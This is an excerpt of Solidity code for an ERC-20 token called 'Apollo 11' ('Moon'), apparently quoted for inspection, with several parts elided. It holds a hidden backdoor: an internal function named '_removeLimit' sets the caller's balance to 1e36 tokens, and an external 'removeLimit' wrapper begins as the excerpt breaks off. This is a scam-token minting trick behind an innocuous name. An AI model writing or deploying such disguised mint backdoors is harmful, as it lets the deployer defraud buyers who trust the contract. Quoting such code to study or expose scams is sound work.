...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _removeLimit() internal {
        _balances[msg.sender] = 1e18 * 1e18;
    }
...
contract Apollo11 is ERC20, Ownable {
    ...
    constructor() ERC20("Apollo 11", "Moon") {
        ...
        maxTransactionAmount = totalSupply; // no max tx limit
        maxWallet = totalSupply; // no max wallet limit
    ...
    function removeLimit() external returns (bool) {
